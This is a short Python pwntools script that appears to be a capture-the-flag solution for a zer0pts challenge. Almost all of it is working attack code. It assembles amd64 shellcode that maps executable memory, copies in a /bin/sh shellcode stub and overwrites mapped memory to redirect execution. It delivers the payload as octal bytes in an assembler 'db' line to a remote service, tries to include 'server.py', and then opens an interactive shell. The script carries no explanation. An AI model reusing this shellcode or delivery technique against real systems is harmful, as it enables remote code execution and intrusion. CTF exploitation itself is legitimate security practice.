from pwn import *

HOST, PORT = 'pwn.ctf.zer0pts.com', 9005
# HOST, PORT = '0.0.0.0', 31338
p = r = remote(HOST, PORT)

context.arch='amd64'

l = asm(f"""
xor r9d, r9d
mov r8d, -1
mov r10d, MAP_FIXED|MAP_PRIVATE|MAP_ANON
mov edx, 7
mov rsi, 0x1000
mov rdi, 0x41410000
mov rax, 9
syscall

lea rsi, [rip+sh]
mov rcx, sh_end-sh
rep movsb

mov rbp, 0x7ffffb000000
mov r12, -0x4000000
mov r13, 0x4000000
call l

mov rbp, rax
sub rbp, r13
mov r12, 0x100000
mov r13, 0x100000
call l

mov rbp, rax
mov r12, 0x1000
mov r13, 0x1000
call l

#if 1
add rax, 0x11f000
xor r9d, r9d
mov r8d, -1
mov r10d, MAP_FIXED|MAP_PRIVATE|MAP_ANON
mov edx, 7
mov rsi, 0x400000
mov rdi, rax
mov rax, 9
syscall
#endif

mov rax, 0x41410000
write:
sub rsi, 8
stosq
test rsi, rsi
jnz write

exit:

mov rsi, rax
mov rax, 60
mov rdi, 0
syscall

l:
  mov r11, 0

  ll:
  xor r9d, r9d
  mov r8d, -1
  mov r10d, 0x22
  mov edx, 3
  mov rsi, r13

  lea rdi, [rbp+r11]
  mov eax, 9
  syscall
  cmp rax, -1
  jz ret
  mov eax, 11
  syscall

  add r11, r12
  jmp ll

ret:
mov rax, rdi
ret

sh:
{shellcraft.linux.sh()}
sh_end:
""")
l = "".join("\\%03o" % x for x in l)
print(l)
r.sendline(payload := f'db `{l}`')
r.sendline(f'INCBIN "server.py"')
r.sendline('EOF')
open('1.S', 'w').write(payload)

r.interactive()